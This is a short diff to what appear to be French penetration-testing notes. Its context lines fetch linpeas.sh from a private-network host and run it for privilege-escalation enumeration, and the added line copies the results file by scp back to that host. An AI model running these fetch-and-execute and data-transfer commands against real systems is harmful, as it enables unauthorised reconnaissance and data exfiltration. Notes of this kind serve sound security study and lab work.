@@ -340,6 +340,7 @@ Protocoles à tester : SMB, WINRM, RDP, MSSQL, FTP, LDAP, SSH
     wget http://192.168.50.100/linpeas.sh
     chmod u+x linpeas.sh
     ./linpeas.sh | tee resultat.txt
+    scp ./resultat.txt timothe@192.168.50.100:/home/timothe/resultat.txt
     less -R resultat.txt
 
 **Clés SSH** 
